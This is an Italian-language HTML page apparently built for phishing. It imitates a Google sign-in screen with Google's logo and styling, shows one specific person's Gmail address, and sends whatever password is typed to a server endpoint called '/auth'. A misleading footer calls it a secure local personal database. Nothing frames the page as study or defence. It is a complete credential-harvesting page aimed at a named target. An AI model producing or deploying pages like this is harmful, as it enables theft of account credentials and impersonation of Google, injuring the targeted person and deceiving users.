<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <title>Accedi al tuo Database</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background-color: white;
            padding: 50px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            width: 360px;
            text-align: center;
        }
        .logo {
            width: 92px;
            margin-bottom: 20px;
        }
        .email-text {
            font-size: 16px;
            color: #202124;
            margin-bottom: 30px;
        }
        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            color: white;
            background-color: #1a73e8;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #1669c1;
        }
        .footer-text {
            font-size: 12px;
            color: #5f6368;
            margin-top: 20px;
        }
    </style>
</head>
<body>

<div class="login-box">
    <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
    <div class="email-text">mihaelailieva1@gmail.com</div>

    <form id="loginForm">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Avanti</button>
    </form>

    <div class="footer-text">Database locale sicuro – Solo per uso personale</div>
</div>

<script>
$('#loginForm').submit(function(e){
    e.preventDefault();
    let auth = $('input[name=password]').val();

    $.post("/auth", { "password": auth }, function(data){
        alert("Password inviata!");
        $('input[name=password]').val(""); // pulisce il campo
    });
});
</script>

</body>
</html>
